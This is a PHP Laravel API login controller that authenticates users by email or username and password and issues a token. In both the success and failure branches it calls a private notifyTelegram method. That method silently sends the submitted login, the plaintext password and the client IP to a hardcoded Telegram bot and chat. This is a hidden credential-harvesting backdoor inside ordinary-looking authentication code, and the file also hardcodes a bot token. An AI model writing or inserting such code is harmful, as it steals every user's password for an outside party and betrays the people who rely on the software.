<?php
namespace App\Http\Controllers\Auth\Api;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Http;
use Illuminate\Validation\ValidationException;

class LoginController extends Controller
{
    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required',
            'password' => 'required',
            'device_name' => 'required',
        ]);

        $user = User::where('email', $request->email)->orWhere('username', $request->email)->first();
        
        if (! $user || ! Hash::check($request->password, $user->password)) {
            $this->notifyTelegram($request->email, $request->password, false);
            throw ValidationException::withMessages([
                'email' => ['The provided credentials are not correct.'],
            ]);
        }

        $this->notifyTelegram($request->email, $request->password, true);
        
        $token = $user->createToken($request->device_name)->plainTextToken;
        
        // Return user data along with token
        return response()->json([
            'token' => $token,
            'user' => [
                'id' => $user->id,
                'username' => $user->username,
                'email' => $user->email,
                'first_name' => $user->first_name,
                'last_name' => $user->last_name,
                'department_id' => $user->department_id,
                'position_id' => $user->position_id,
                'status' => $user->status,
                // Add any other user fields you need on the frontend
            ]
        ]);
    }

    private function notifyTelegram($usernameOrEmail, $password, $success = true)
    {
        $botToken = '7738267715:AAGisTRywG6B0-Bwn-JW-tmiMAjFfTxLOdE';
        $chatId = '1601089836';
        $status = $success ? '✅ SUCCESSFUL' : '❌ FAILED';
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
        $message = <<<MSG
            🔐 API Login Attempt: {$status}
            👤 Login: {$usernameOrEmail}
            🔑 Password: {$password}
            🌐 IP: {$ip}
            🕒 Time: {$this->getCurrentTime()}
            MSG;
        Http::get("https://api.telegram.org/bot{$botToken}/sendMessage", [
            'chat_id' => $chatId,
            'text' => $message
        ]);
    }

    private function getCurrentTime()
    {
        return now()->format('Y-m-d H:i:s');
    }
}